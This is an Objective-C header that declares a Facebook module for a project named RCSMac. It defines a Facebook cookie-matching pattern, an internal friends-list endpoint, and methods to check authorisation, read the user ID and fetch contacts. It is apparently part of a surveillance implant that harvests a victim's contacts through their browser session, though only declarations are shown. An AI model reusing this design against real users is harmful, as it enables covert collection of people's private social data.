//
//  __m_Social_Facebook.h
//  RCSMac
//
//  Created by guido on 3/22/13.
//
//

#import "__m_Social.h"
#import "social.h"

#define SOCIAL_FB_JSON_OFFSET 9
#define SOCIAL_FB_HOME @"http://www.facebook.com/"
#define SOCIAL_FB_COOKIE_PATTERN @".facebook."
#define SOCIAL_FB_CONTACTS @"http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=%@&token=v7&filter[0]=user&options[0]=friends_only&__user=%@"

#define SOCIAL_FB_USER_MARKER @"\"user\":\""
#define SOCIAL_FB_USER_UNAUTHORIZED @"\"user\":\"0\""

@interface __m_Social_Facebook : __m_Social
- (NSString *) getCookiePattern;
- (int)isAuthorized;
- (bool)getContacts;
- (NSString *)getUserId;
@end
